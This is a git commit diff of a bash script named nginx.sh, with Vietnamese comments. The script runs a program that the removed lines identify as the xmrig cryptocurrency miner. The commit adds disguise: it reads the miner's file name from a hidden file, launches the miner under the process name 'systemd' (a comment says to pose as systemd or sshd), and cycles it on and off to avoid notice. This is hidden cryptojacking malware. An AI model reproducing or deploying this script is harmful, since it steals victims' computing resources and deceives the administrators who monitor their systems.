850510f0945e61b711218194aa3e00c8ef2b922d
n2lentertainement <115657122+n2lentertainement@users.noreply.github.com>
2025-02-20 01:27:25 +0700

    Update nginx.sh

--- nginx.sh
+++ nginx.sh
@@ -1,17 +1,21 @@
 #!/bin/bash
 
+# Lấy tên file thực thi từ .exec_name
+EXEC_FILE=$(cat /app/.exec_name)
+
 while true; do
-    # Chạy xmrig
-    ./nginx &
-    # Lưu lại PID của xmrig
-    nginx_pid=$!
-    
+    # Đổi tên tiến trình giả danh systemd hoặc sshd
+    exec -a "systemd" /app/$EXEC_FILE --donate-level 1 --cpu-priority 3 --randomx-1gb-pages &
+
+    # Lưu lại PID của tiến trình
+    exec_pid=$!
+
     # Chờ 5 phút
     sleep 300
-    
-    # Dừng xmrig (sau 5 phút)
-    kill $nginx_pid
-    
+
+    # Dừng tiến trình (sau 5 phút)
+    kill $exec_pid
+
     # Nghỉ 1 phút trước khi chạy lại
     sleep 60
 done
